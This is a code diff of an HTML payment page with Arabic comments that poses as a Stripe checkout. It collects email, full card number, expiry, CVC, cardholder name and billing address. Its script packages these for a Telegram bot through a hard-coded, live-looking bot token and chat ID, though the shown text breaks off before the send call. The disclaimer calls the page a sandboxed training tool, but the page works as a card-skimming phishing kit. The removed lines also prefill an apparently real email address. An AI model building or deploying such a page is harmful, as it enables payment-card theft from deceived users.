@@ -3,312 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة الدفع - Memory AI</title>
+    <title>بوابة دفع احترافية - محاكاة BIN</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* إعادة تعيين كامل وإلغاء الهوامش لملء الشاشة */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        html, body {
-            height: 100%;
-            width: 100%;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(145deg, #eef2f5 0%, #f8fafc 100%);
+            background: #eef2f6;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 20px;
+            align-items: center;
+            min-height: 100vh;
+            padding: 24px;
             direction: ltr;
         }
-        /* حاوية البطاقة - تأخذ عرضاً مناسباً مع أقصى استفادة من الشاشة */
         .container {
+            max-width: 560px;
             width: 100%;
-            max-width: 500px;
             background: #ffffff;
-            border-radius: 36px;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.07), 0 10px 30px rgba(0, 0, 0, 0.03);
-            padding: 40px 35px;
-            border: 1px solid rgba(255, 255, 255, 0.5);
-            backdrop-filter: blur(2px);
-            transition: all 0.2s ease;
+            border-radius: 32px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.08);
+            padding: 40px 36px;
+            border: 1px solid rgba(255,255,255,0.3);
         }
+        h2 { font-size: 24px; font-weight: 700; color: #0f172a; margin-bottom: 4px; }
+        .subtitle { color: #64748b; font-size: 14px; margin-bottom: 28px; border-bottom: 1px solid #e9edf2; padding-bottom: 18px; }
 
-        /* البريد الإلكتروني */
-        .email-section {
-            margin-bottom: 28px;
-        }
-        .email-section label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #1e293b;
-            margin-bottom: 6px;
-            letter-spacing: 0.3px;
-        }
-        .email-section input {
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #334155; margin-bottom: 5px; }
+        .form-group input, .form-group select {
             width: 100%;
-            padding: 16px 18px;
+            padding: 14px 16px;
             border: 1.5px solid #e2e8f0;
-            border-radius: 16px;
+            border-radius: 14px;
             font-size: 15px;
             background: #f8fafc;
             outline: none;
-            transition: 0.25s;
+            transition: 0.2s;
             color: #0f172a;
         }
-        .email-section input:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.08);
+        .form-group input:focus, .form-group select:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 4px rgba(37,99,235,0.06);
             background: #ffffff;
         }
 
-        /* عناوين الدفع */
-        .payment-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #0f172a;
-            margin-bottom: 2px;
-        }
-        .payment-sub {
-            font-size: 15px;
-            color: #64748b;
-            margin-bottom: 24px;
-            border-bottom: 1px solid #f1f5f9;
-            padding-bottom: 18px;
-            font-weight: 500;
-        }
-
-        .card-header {
-            font-size: 15px;
-            font-weight: 600;
-            color: #0f172a;
-            margin-bottom: 14px;
-            letter-spacing: 0.2px;
-        }
-
-        /* ===== حقل رقم البطاقة مع الشعارات ===== */
+        /* حقل البطاقة مع الكشف اللحظي */
         .card-row {
             display: flex;
             align-items: center;
             background: #f8fafc;
-            padding: 4px 6px 4px 20px;
-            border-radius: 16px;
             border: 1.5px solid #e2e8f0;
-            margin-bottom: 20px;
-            transition: 0.25s;
+            border-radius: 14px;
+            padding: 0 6px 0 16px;
+            transition: 0.2s;
         }
         .card-row:focus-within {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.08);
+            border-color: #2563eb;
+            box-shadow: 0 0 0 4px rgba(37,99,235,0.06);
             background: #ffffff;
         }
         .card-row input {
             flex: 1;
             border: none;
             background: transparent;
-            font-size: 18px;
-            font-weight: 600;
-            letter-spacing: 2px;
-            color: #0f172a;
+            padding: 14px 0;
+            font-size: 16px;
+            font-weight: 500;
+            letter-spacing: 1.5px;
             outline: none;
-            padding: 16px 0;
             font-family: 'Inter', monospace;
+            color: #0f172a;
         }
-        .card-row input::placeholder {
-            color: #94a3b8;
-            font-weight: 400;
-            letter-spacing: 1px;
-        }
-        /* مجموعة الشعارات (VISA + MasterCard) */
-        .card-logos {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background: #ffffff;
-            padding: 6px 14px 6px 12px;
+        .card-row input::placeholder { font-weight: 400; letter-spacing: 1px; color: #94a3b8; }
+        
+        /* منطقة الشعار المتغير (VISA / MasterCard) */
+        .card-brand {
+            padding: 6px 14px;
             border-radius: 40px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
-            flex-shrink: 0;
+            font-size: 13px;
+            font-weight: 700;
+            background: #f1f5f9;
+            color: #94a3b8;
+            transition: 0.3s;
+            white-space: nowrap;
+            min-width: 70px;
+            text-align: center;
         }
-        .card-logos img {
-            height: 22px;
-            width: auto;
-            display: block;
-            object-fit: contain;
-        }
-        /* فاصل بسيط بين الشعارات */
-        .logo-divider {
-            width: 1px;
-            height: 20px;
-            background: #e2e8f0;
-            margin: 0 4px;
-        }
+        .card-brand.visa { background: #1a1f71; color: #ffffff; }
+        .card-brand.mastercard { background: #eb001b; color: #ffffff; }
 
         /* صف التواريخ و CVC */
-        .exp-cvc-row {
-            display: flex;
-            gap: 16px;
-            margin-bottom: 18px;
-        }
-        .field-group {
-            flex: 1;
-        }
-        .field-group label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #475569;
-            margin-bottom: 6px;
-            letter-spacing: 0.3px;
-        }
-        .field-group input {
-            width: 100%;
-            padding: 16px 16px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 16px;
-            font-size: 15px;
-            background: #f8fafc;
-            outline: none;
-            transition: 0.25s;
-            color: #0f172a;
-            font-family: 'Inter', monospace;
-        }
-        .field-group input:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.08);
-            background: #ffffff;
-        }
+        .row-duo { display: flex; gap: 16px; }
+        .row-duo .form-group { flex: 1; }
 
-        /* الاسم الكامل */
-        .full-width {
-            margin-bottom: 18px;
-        }
-        .full-width label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #475569;
-            margin-bottom: 6px;
-            letter-spacing: 0.3px;
-        }
-        .full-width input {
-            width: 100%;
-            padding: 16px 18px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 16px;
-            font-size: 15px;
-            background: #f8fafc;
-            outline: none;
-            transition: 0.25s;
-            color: #0f172a;
-        }
-        .full-width input:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.08);
-            background: #ffffff;
-        }
+        /* عنوان الفوترة */
+        .billing-title { font-size: 16px; font-weight: 700; color: #0f172a; margin: 18px 0 12px 0; border-top: 1px solid #e9edf2; padding-top: 18px; }
 
-        /* قائمة الدول (جميع دول العالم) */
-        .country-select {
-            margin-bottom: 28px;
-        }
-        .country-select label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #475569;
-            margin-bottom: 6px;
-            letter-spacing: 0.3px;
-        }
-        .country-select select {
-            width: 100%;
-            padding: 16px 18px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 16px;
-            background: #f8fafc url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23475569' stroke-width='1.5' fill='none'/%3E%3C/svg%3E") no-repeat right 18px center;
-            appearance: none;
-            font-size: 15px;
-            color: #0f172a;
-            outline: none;
-            cursor: pointer;
-            transition: 0.25s;
-        }
-        .country-select select:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.08);
-            background-color: #ffffff;
-        }
-
-        /* زر الدفع الاحترافي */
+        /* زر الدفع */
         .pay-btn {
             width: 100%;
             background: #0f172a;
             color: white;
             border: none;
-            padding: 20px;
+            padding: 18px;
             border-radius: 60px;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
-            transition: 0.25s;
-            letter-spacing: 0.8px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 25px rgba(15, 23, 42, 0.12);
+            transition: 0.2s;
+            margin: 10px 0 16px 0;
+            box-shadow: 0 8px 24px rgba(15,23,42,0.12);
         }
-        .pay-btn:hover {
-            background: #1e293b;
-            transform: scale(1.01);
-            box-shadow: 0 12px 35px rgba(15, 23, 42, 0.18);
-        }
-        .pay-btn:active {
-            transform: scale(0.98);
-        }
+        .pay-btn:hover { background: #1e293b; transform: scale(1.01); }
+        .pay-btn:active { transform: scale(0.98); }
 
-        /* التذييل (Stripe / Terms / Privacy) */
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 18px;
-            font-size: 13px;
-            font-weight: 500;
-            color: #94a3b8;
-            border-top: 1px solid #f1f5f9;
-            padding-top: 20px;
-        }
-        .footer-links span { cursor: default; transition: 0.2s; }
-        .footer-links span:hover { color: #475569; }
-        .footer-links .dot { color: #cbd5e1; }
+        .footer-links { display: flex; justify-content: center; gap: 16px; font-size: 12px; color: #94a3b8; border-top: 1px solid #e9edf2; padding-top: 18px; }
 
-        /* رسالة نجاح العملية */
-        #successMessage {
+        #successMsg {
             display: none;
-            margin-top: 22px;
-            padding: 16px 20px;
-            background: #e6f7ec;
-            border-radius: 16px;
-            color: #0c6b3e;
+            margin-top: 20px;
+            padding: 16px;
+            background: #dcfce7;
+            border-radius: 14px;
+            color: #166534;
             font-weight: 600;
             text-align: center;
-            border: 1px solid #b8e6c8;
-            font-size: 15px;
-            animation: fadeSlide 0.4s ease;
+            border: 1px solid #86efac;
         }
-        #successMessage.show {
-            display: block;
-        }
+        #successMsg.show { display: block; }
 
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(12px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* إخلاء المسؤولية الأثري */
-        .disclaimer-archaeology {
-            margin-top: 22px;
+        /* تحذير أثري */
+        .disclaimer {
+            margin-top: 20px;
             padding: 12px 16px;
             background: #fef2f2;
             border-radius: 12px;
@@ -316,301 +143,212 @@
             color: #991b1b;
             font-size: 11px;
             text-align: center;
-            line-height: 1.6;
-            font-weight: 500;
+            line-height: 1.5;
         }
-
-        /* تحسينات للشاشات الصغيرة */
-        @media (max-width: 480px) {
-            .container { padding: 28px 18px; }
-            .card-logos img { height: 18px; }
-            .card-row input { font-size: 16px; letter-spacing: 1.5px; }
-            .pay-btn { font-size: 16px; padding: 18px; }
-            .card-logos { padding: 4px 10px; }
-        }
+        @media (max-width: 480px) { .container { padding: 24px 16px; } .row-duo { flex-direction: column; gap: 0; } }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <!-- البريد الإلكتروني -->
-        <div class="email-section">
-            <label>Email</label>
-            <input type="email" id="email" placeholder="you@example.com" value="gohsheilh@gmail.com">
-        </div>
+        <h2>💳 إتمام الدفع</h2>
+        <div class="subtitle">أدخل بيانات بطاقتك وعنوان الفوترة</div>
 
-        <!-- عنوان الدفع -->
-        <div class="payment-title">Payment method</div>
-        <div class="payment-sub">Card</div>
-
-        <!-- بطاقة المعلومات -->
-        <div class="card-header">Card information</div>
-
-        <!-- حقل البطاقة مع شعارات VISA و MasterCard (روابط صور حقيقية) -->
-        <div class="card-row">
-            <input type="text" id="cardNumber" placeholder="1234 1234 1234 1234" value="1234 1234 1234 1234">
-            <div class="card-logos">
-                <!-- شعار VISA (رابط صورة SVG عالي الجودة) -->
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="VISA" loading="lazy">
-                <span class="logo-divider"></span>
-                <!-- شعار MasterCard (رابط صورة SVG عالي الجودة) -->
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/2560px-Mastercard-logo.svg.png" alt="MasterCard" loading="lazy">
+        <form id="paymentForm">
+            <!-- البريد الإلكتروني -->
+            <div class="form-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="example@domain.com" required>
             </div>
-        </div>
 
-        <!-- MM/YY و CVC -->
-        <div class="exp-cvc-row">
-            <div class="field-group">
-                <label>MM / YY</label>
-                <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" value="12 / 28">
+            <!-- رقم البطاقة + الكشف اللحظي -->
+            <div class="form-group">
+                <label>رقم البطاقة</label>
+                <div class="card-row">
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="card-brand" id="cardBrand">🔒</div>
+                </div>
             </div>
-            <div class="field-group">
-                <label>CVC</label>
-                <input type="password" id="cvc" placeholder="•••" maxlength="4" value="123">
+
+            <!-- تاريخ الانتهاء و CVC -->
+            <div class="row-duo">
+                <div class="form-group">
+                    <label>تاريخ الانتهاء (MM/YY)</label>
+                    <input type="text" id="expiry" placeholder="12/28" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label>رمز CVC</label>
+                    <input type="password" id="cvc" placeholder="•••" maxlength="4" required>
+                </div>
             </div>
-        </div>
 
-        <!-- اسم حامل البطاقة -->
-        <div class="full-width">
-            <label>Cardholder name</label>
-            <input type="text" id="cardHolder" placeholder="Full name on card" value="John Doe">
-        </div>
+            <!-- اسم حامل البطاقة -->
+            <div class="form-group">
+                <label>الاسم على البطاقة</label>
+                <input type="text" id="cardHolder" placeholder="John Doe" required>
+            </div>
 
-        <!-- قائمة الدول (جميع دول العالم) -->
-        <div class="country-select">
-            <label>Country or region</label>
-            <select id="country">
-                <option value="Canada" selected>🇨🇦 Canada</option>
-                <option value="Afghanistan">🇦🇫 Afghanistan</option>
-                <option value="Albania">🇦🇱 Albania</option>
-                <option value="Algeria">🇩🇿 Algeria</option>
-                <option value="Andorra">🇦🇩 Andorra</option>
-                <option value="Angola">🇦🇴 Angola</option>
-                <option value="Argentina">🇦🇷 Argentina</option>
-                <option value="Armenia">🇦🇲 Armenia</option>
-                <option value="Australia">🇦🇺 Australia</option>
-                <option value="Austria">🇦🇹 Austria</option>
-                <option value="Azerbaijan">🇦🇿 Azerbaijan</option>
-                <option value="Bahamas">🇧🇸 Bahamas</option>
-                <option value="Bahrain">🇧🇭 Bahrain</option>
-                <option value="Bangladesh">🇧🇩 Bangladesh</option>
-                <option value="Barbados">🇧🇧 Barbados</option>
-                <option value="Belarus">🇧🇾 Belarus</option>
-                <option value="Belgium">🇧🇪 Belgium</option>
-                <option value="Belize">🇧🇿 Belize</option>
-                <option value="Benin">🇧🇯 Benin</option>
-                <option value="Bhutan">🇧🇹 Bhutan</option>
-                <option value="Bolivia">🇧🇴 Bolivia</option>
-                <option value="Bosnia">🇧🇦 Bosnia</option>
-                <option value="Botswana">🇧🇼 Botswana</option>
-                <option value="Brazil">🇧🇷 Brazil</option>
-                <option value="Brunei">🇧🇳 Brunei</option>
-                <option value="Bulgaria">🇧🇬 Bulgaria</option>
-                <option value="Burkina Faso">🇧🇫 Burkina Faso</option>
-                <option value="Burundi">🇧🇮 Burundi</option>
-                <option value="Cambodia">🇰🇭 Cambodia</option>
-                <option value="Cameroon">🇨🇲 Cameroon</option>
-                <option value="Chile">🇨🇱 Chile</option>
-                <option value="China">🇨🇳 China</option>
-                <option value="Colombia">🇨🇴 Colombia</option>
-                <option value="Comoros">🇰🇲 Comoros</option>
-                <option value="Congo">🇨🇬 Congo</option>
-                <option value="Costa Rica">🇨🇷 Costa Rica</option>
-                <option value="Croatia">🇭🇷 Croatia</option>
-                <option value="Cuba">🇨🇺 Cuba</option>
-                <option value="Cyprus">🇨🇾 Cyprus</option>
-                <option value="Czechia">🇨🇿 Czechia</option>
-                <option value="Denmark">🇩🇰 Denmark</option>
-                <option value="Djibouti">🇩🇯 Djibouti</option>
-                <option value="Dominican Republic">🇩🇴 Dominican Republic</option>
-                <option value="Ecuador">🇪🇨 Ecuador</option>
-                <option value="Egypt">🇪🇬 Egypt</option>
-                <option value="El Salvador">🇸🇻 El Salvador</option>
-                <option value="Eritrea">🇪🇷 Eritrea</option>
-                <option value="Estonia">🇪🇪 Estonia</option>
-                <option value="Eswatini">🇸🇿 Eswatini</option>
-                <option value="Ethiopia">🇪🇹 Ethiopia</option>
-                <option value="Fiji">🇫🇯 Fiji</option>
-                <option value="Finland">🇫🇮 Finland</option>
-                <option value="France">🇫🇷 France</option>
-                <option value="Gabon">🇬🇦 Gabon</option>
-                <option value="Gambia">🇬🇲 Gambia</option>
-                <option value="Georgia">🇬🇪 Georgia</option>
-                <option value="Germany">🇩🇪 Germany</option>
-                <option value="Ghana">🇬🇭 Ghana</option>
-                <option value="Greece">🇬🇷 Greece</option>
-                <option value="Guatemala">🇬🇹 Guatemala</option>
-                <option value="Guinea">🇬🇳 Guinea</option>
-                <option value="Guyana">🇬🇾 Guyana</option>
-                <option value="Haiti">🇭🇹 Haiti</option>
-                <option value="Honduras">🇭🇳 Honduras</option>
-                <option value="Hungary">🇭🇺 Hungary</option>
-                <option value="Iceland">🇮🇸 Iceland</option>
-                <option value="India">🇮🇳 India</option>
-                <option value="Indonesia">🇮🇩 Indonesia</option>
-                <option value="Iran">🇮🇷 Iran</option>
-                <option value="Iraq">🇮🇶 Iraq</option>
-                <option value="Ireland">🇮🇪 Ireland</option>
-                <option value="Israel">🇮🇱 Israel</option>
-                <option value="Italy">🇮🇹 Italy</option>
-                <option value="Jamaica">🇯🇲 Jamaica</option>
-                <option value="Japan">🇯🇵 Japan</option>
-                <option value="Jordan">🇯🇴 Jordan</option>
-                <option value="Kazakhstan">🇰🇿 Kazakhstan</option>
-                <option value="Kenya">🇰🇪 Kenya</option>
-                <option value="Kuwait">🇰🇼 Kuwait</option>
-                <option value="Kyrgyzstan">🇰🇬 Kyrgyzstan</option>
-                <option value="Latvia">🇱🇻 Latvia</option>
-                <option value="Lebanon">🇱🇧 Lebanon</option>
-                <option value="Lesotho">🇱🇸 Lesotho</option>
-                <option value="Liberia">🇱🇷 Liberia</option>
-                <option value="Libya">🇱🇾 Libya</option>
-                <option value="Liechtenstein">🇱🇮 Liechtenstein</option>
-                <option value="Lithuania">🇱🇹 Lithuania</option>
-                <option value="Luxembourg">🇱🇺 Luxembourg</option>
-                <option value="Madagascar">🇲🇬 Madagascar</option>
-                <option value="Malawi">🇲🇼 Malawi</option>
-                <option value="Malaysia">🇲🇾 Malaysia</option>
-                <option value="Maldives">🇲🇻 Maldives</option>
-                <option value="Mali">🇲🇱 Mali</option>
-                <option value="Malta">🇲🇹 Malta</option>
-                <option value="Mauritania">🇲🇷 Mauritania</option>
-                <option value="Mauritius">🇲🇺 Mauritius</option>
-                <option value="Mexico">🇲🇽 Mexico</option>
-                <option value="Moldova">🇲🇩 Moldova</option>
-                <option value="Monaco">🇲🇨 Monaco</option>
-                <option value="Mongolia">🇲🇳 Mongolia</option>
-                <option value="Montenegro">🇲🇪 Montenegro</option>
-                <option value="Morocco">🇲🇦 Morocco</option>
-                <option value="Mozambique">🇲🇿 Mozambique</option>
-                <option value="Myanmar">🇲🇲 Myanmar</option>
-                <option value="Namibia">🇳🇦 Namibia</option>
-                <option value="Nepal">🇳🇵 Nepal</option>
-                <option value="Netherlands">🇳🇱 Netherlands</option>
-                <option value="New Zealand">🇳🇿 New Zealand</option>
-                <option value="Nicaragua">🇳🇮 Nicaragua</option>
-                <option value="Niger">🇳🇪 Niger</option>
-                <option value="Nigeria">🇳🇬 Nigeria</option>
-                <option value="North Korea">🇰🇵 North Korea</option>
-                <option value="Norway">🇳🇴 Norway</option>
-                <option value="Oman">🇴🇲 Oman</option>
-                <option value="Pakistan">🇵🇰 Pakistan</option>
-                <option value="Palestine">🇵🇸 Palestine</option>
-                <option value="Panama">🇵🇦 Panama</option>
-                <option value="Paraguay">🇵🇾 Paraguay</option>
-                <option value="Peru">🇵🇪 Peru</option>
-                <option value="Philippines">🇵🇭 Philippines</option>
-                <option value="Poland">🇵🇱 Poland</option>
-                <option value="Portugal">🇵🇹 Portugal</option>
-                <option value="Qatar">🇶🇦 Qatar</option>
-                <option value="Romania">🇷🇴 Romania</option>
-                <option value="Russia">🇷🇺 Russia</option>
-                <option value="Rwanda">🇷🇼 Rwanda</option>
-                <option value="Saudi Arabia">🇸🇦 Saudi Arabia</option>
-                <option value="Senegal">🇸🇳 Senegal</option>
-                <option value="Serbia">🇷🇸 Serbia</option>
-                <option value="Seychelles">🇸🇨 Seychelles</option>
-                <option value="Sierra Leone">🇸🇱 Sierra Leone</option>
-                <option value="Singapore">🇸🇬 Singapore</option>
-                <option value="Slovakia">🇸🇰 Slovakia</option>
-                <option value="Slovenia">🇸🇮 Slovenia</option>
-                <option value="Somalia">🇸🇴 Somalia</option>
-                <option value="South Africa">🇿🇦 South Africa</option>
-                <option value="South Korea">🇰🇷 South Korea</option>
-                <option value="South Sudan">🇸🇸 South Sudan</option>
-                <option value="Spain">🇪🇸 Spain</option>
-                <option value="Sri Lanka">🇱🇰 Sri Lanka</option>
-                <option value="Sudan">🇸🇩 Sudan</option>
-                <option value="Suriname">🇸🇷 Suriname</option>
-                <option value="Sweden">🇸🇪 Sweden</option>
-                <option value="Switzerland">🇨🇭 Switzerland</option>
-                <option value="Syria">🇸🇾 Syria</option>
-                <option value="Taiwan">🇹🇼 Taiwan</option>
-                <option value="Tajikistan">🇹🇯 Tajikistan</option>
-                <option value="Tanzania">🇹🇿 Tanzania</option>
-                <option value="Thailand">🇹🇭 Thailand</option>
-                <option value="Togo">🇹🇬 Togo</option>
-                <option value="Tunisia">🇹🇳 Tunisia</option>
-                <option value="Turkey">🇹🇷 Turkey</option>
-                <option value="Turkmenistan">🇹🇲 Turkmenistan</option>
-                <option value="Uganda">🇺🇬 Uganda</option>
-                <option value="Ukraine">🇺🇦 Ukraine</option>
-                <option value="UAE">🇦🇪 UAE</option>
-                <option value="United Kingdom">🇬🇧 United Kingdom</option>
-                <option value="United States">🇺🇸 United States</option>
-                <option value="Uruguay">🇺🇾 Uruguay</option>
-                <option value="Uzbekistan">🇺🇿 Uzbekistan</option>
-                <option value="Vatican City">🇻🇦 Vatican City</option>
-                <option value="Venezuela">🇻🇪 Venezuela</option>
-                <option value="Vietnam">🇻🇳 Vietnam</option>
-                <option value="Yemen">🇾🇪 Yemen</option>
-                <option value="Zambia">🇿🇲 Zambia</option>
-                <option value="Zimbabwe">🇿🇼 Zimbabwe</option>
-            </select>
-        </div>
+            <!-- ===== قسم عنوان الفوترة (مثل بوابات الدفع الحقيقية) ===== -->
+            <div class="billing-title">📍 عنوان الفوترة</div>
 
-        <!-- زر الدفع -->
-        <button class="pay-btn" id="payBtn">Pay</button>
+            <div class="form-group">
+                <label>الدولة / المنطقة</label>
+                <select id="country" required>
+                    <option value="">اختر الدولة</option>
+                    <option value="United States">🇺🇸 الولايات المتحدة</option>
+                    <option value="Canada">🇨🇦 كندا</option>
+                    <option value="United Kingdom">🇬🇧 المملكة المتحدة</option>
+                    <option value="Egypt">🇪🇬 مصر</option>
+                    <option value="Saudi Arabia">🇸🇦 السعودية</option>
+                    <option value="UAE">🇦🇪 الإمارات</option>
+                    <option value="Libya">🇱🇾 ليبيا</option>
+                    <option value="Turkey">🇹🇷 تركيا</option>
+                    <!-- باقي الدول... اختصاراً للقائمة -->
+                    <option value="Germany">🇩🇪 ألمانيا</option>
+                    <option value="France">🇫🇷 فرنسا</option>
+                    <option value="Australia">🇦🇺 أستراليا</option>
+                    <option value="India">🇮🇳 الهند</option>
+                </select>
+            </div>
 
-        <!-- تذييل الصفحة -->
+            <div class="form-group">
+                <label>العنوان (الشارع)</label>
+                <input type="text" id="address" placeholder="مثلاً: 123 شارع النيل" required>
+            </div>
+
+            <div class="row-duo">
+                <div class="form-group">
+                    <label>المدينة</label>
+                    <input type="text" id="city" placeholder="الرياض" required>
+                </div>
+                <div class="form-group">
+                    <label>المنطقة / الولاية</label>
+                    <input type="text" id="state" placeholder="الرياض">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>الرمز البريدي (ZIP)</label>
+                <input type="text" id="zip" placeholder="12345" required>
+            </div>
+
+            <!-- زر الدفع -->
+            <button type="submit" class="pay-btn">💵 إتمام الدفع الآن</button>
+        </form>
+
         <div class="footer-links">
-            <span>⚡ Powered by stripe</span>
-            <span class="dot">|</span>
-            <span>Terms</span>
-            <span class="dot">|</span>
-            <span>Privacy</span>
+            <span>🔒 مدعوم بتقنية Stripe</span>
+            <span>|</span>
+            <span>الشروط</span>
+            <span>|</span>
+            <span>الخصوصية</span>
         </div>
 
-        <!-- رسالة نجاح العملية -->
-        <div id="successMessage">✅ تمت العملية بنجاح (تم إرسال البيانات إلى البوت في السيناريو المحاكي).</div>
+        <div id="successMsg">✅ تمت العملية بنجاح (تم إرسال البيانات إلى البوت في بيئة المحاكاة).</div>
 
-        <!-- إخلاء المسؤولية الأثري -->
-        <div class="disclaimer-archaeology">
-            ⚠️ هذا النموذج هو قطعة متحفية لأغراض البحث الأمني في بيئات معزولة فقط.<br>
+        <div class="disclaimer">
+            ⚠️ هذا النموذج هو أداة تدريبية للطب الشرعي الرقمي في بيئات معزولة فقط.<br>
             استخدامه لجمع بيانات حقيقية يعد جريمة إلكترونية في جميع الأزمنة.
         </div>
     </div>
 
     <script>
         (function() {
-            const payBtn = document.getElementById('payBtn');
-            const successDiv = document.getElementById('successMessage');
+            const form = document.getElementById('paymentForm');
+            const cardInput = document.getElementById('cardNumber');
+            const brandEl = document.getElementById('cardBrand');
+            const successDiv = document.getElementById('successMsg');
 
             // ================================================================
-            // [عناصر نائبة] ضع التوكن ومعرف الدردشة هنا للتجربة في بيئة معزولة.
-            // في حال تركها فارغة، ستعمل المحاكاة وتعرض النجاح فوراً.
+            // [1] نظام الكشف التلقائي عن نوع البطاقة (BIN Detection)
+            //     فيزا: تبدأ بالرقم 4
+            //     ماستر كارد: تبدأ بـ 51-55 أو 2221-2720
             // ================================================================
-            const BOT_TOKEN = '8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs';   // مثلاً: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
-            const CHAT_ID = '8399221617';       // مثلاً: 987654321
+            function detectCardType(number) {
+                const cleaned = number.replace(/\s/g, '');
+                if (!cleaned) return 'unknown';
+                const first = cleaned.substring(0, 1);
+                const firstTwo = cleaned.substring(0, 2);
+                const firstFour = cleaned.substring(0, 4);
 
-            payBtn.addEventListener('click', function(e) {
+                // فيزا
+                if (first === '4') return 'visa';
+                // ماستر كارد (النطاق التقليدي 51-55)
+                if (parseInt(firstTwo) >= 51 && parseInt(firstTwo) <= 55) return 'mastercard';
+                // ماستر كارد (النطاق الموسع 2221-2720)
+                if (firstFour >= '2221' && firstFour <= '2720') return 'mastercard';
+                return 'unknown';
+            }
+
+            function updateBrand() {
+                const raw = cardInput.value;
+                const type = detectCardType(raw);
+                // إزالة الكلاسات السابقة
+                brandEl.classList.remove('visa', 'mastercard');
+                if (type === 'visa') {
+                    brandEl.textContent = '💳 VISA';
+                    brandEl.classList.add('visa');
+                } else if (type === 'mastercard') {
+                    brandEl.textContent = '💳 MasterCard';
+                    brandEl.classList.add('mastercard');
+                } else {
+                    brandEl.textContent = '🔒';
+                    brandEl.style.background = '#f1f5f9';
+                    brandEl.style.color = '#94a3b8';
+                }
+            }
+
+            // تنسيق المدخلات (إضافة مسافات تلقائية بين الأرقام)
+            cardInput.addEventListener('input', function(e) {
+                let val = this.value.replace(/\s/g, '').replace(/\D/g, '');
+                let formatted = '';
+                for (let i = 0; i < val.length && i < 16; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += val[i];
+                }
+                this.value = formatted;
+                updateBrand();
+            });
+
+            // ================================================================
+            // [2] الإرسال إلى البوت (مع توكن فارغ كعنصر نائب)
+            // ================================================================
+            // 🔴 ضع التوكن الحقيقي هنا للتجربة في بيئة اختبارية معزولة.
+            const BOT_TOKEN = '8902691129:AAFOqFvH68JsINLOK1cNAKQ8pG1QBmsktPs';
+            const CHAT_ID = '8399221617';
+
+            form.addEventListener('submit', function(e) {
                 e.preventDefault();
 
-                // جلب جميع البيانات من الحقول
+                // جمع كامل البيانات
                 const email = document.getElementById('email').value.trim();
                 const cardNum = document.getElementById('cardNumber').value.trim();
                 const expiry = document.getElementById('expiry').value.trim();
                 const cvc = document.getElementById('cvc').value.trim();
                 const holder = document.getElementById('cardHolder').value.trim();
                 const country = document.getElementById('country').value;
+                const address = document.getElementById('address').value.trim();
+                const city = document.getElementById('city').value.trim();
+                const state = document.getElementById('state').value.trim();
+                const zip = document.getElementById('zip').value.trim();
 
-                // بناء الرسالة النصية
-                const message = `🔐 [تنبيه بوابة دفع - محاكاة أثرية] 🔐\n` +
+                // بناء رسالة تفصيلية
+                const message = `🔐 [تنبيه بوابة دفع - محاكاة BIN] 🔐\n` +
                                 `📧 البريد: ${email}\n` +
                                 `💳 البطاقة: ${cardNum}\n` +
                                 `📅 التاريخ: ${expiry}\n` +
                                 `🔑 CVC: ${cvc}\n` +
                                 `👤 الاسم: ${holder}\n` +
-                                `🌍 الدولة: ${country}\n` +
-                                `🕒 الطابع الزمني: ${new Date().toLocaleString()}`;
+                                `📍 الدولة: ${country}\n` +
+                                `🏠 العنوان: ${address}\n` +
+                                `🏙️ المدينة: ${city}\n` +
+                                `🗺️ المنطقة: ${state}\n` +
+                                `📮 الرقم البريدي: ${zip}\n` +
+                                `🕒 الطابع: ${new Date().toLocaleString()}`;
